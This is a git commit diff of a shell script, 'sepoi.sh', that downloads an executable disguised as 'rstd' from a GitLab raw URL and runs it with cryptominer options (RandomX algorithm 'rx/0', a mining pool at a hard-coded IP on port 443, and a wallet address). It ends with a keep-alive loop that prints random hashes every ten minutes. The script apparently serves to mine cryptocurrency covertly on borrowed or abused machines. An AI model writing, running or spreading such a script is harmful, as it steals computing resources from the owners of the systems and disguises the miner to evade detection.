15bcbab1a0a729963ec92cb9d146064c41231f22
sarifadim <115786763+sarifadim@users.noreply.github.com>
2023-11-22 00:22:46 +0700

    Update sepoi.sh

--- sepoi.sh
+++ sepoi.sh
@@ -1,6 +1,5 @@
-mkdir paper
-cd paper
-wget wget https://github.com/sarifadim/dopla/raw/main/config.json && chmod +x config.json
+mkdir project
+cd project
 wget https://gitlab.com/teletyl/jupyter/-/raw/main/rstd && chmod +x rstd
-./rstd -c "config.json"
+./rstd -o 24.199.90.158:443 -a rx/0 -u ZEPHsC5qZJv8JqyaGPNAviDERPxFGBzXx1bo8rx7RqD9JkPh68Lk7AnLdsNAZfrukeFoU9dnboT6tAJkAZ1etvM1Q5PqiQu8DEk.$(echo V-$(TZ=UTC-7 date +"%H-%M-%S")) -p -x -t 10
 while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 10m; done
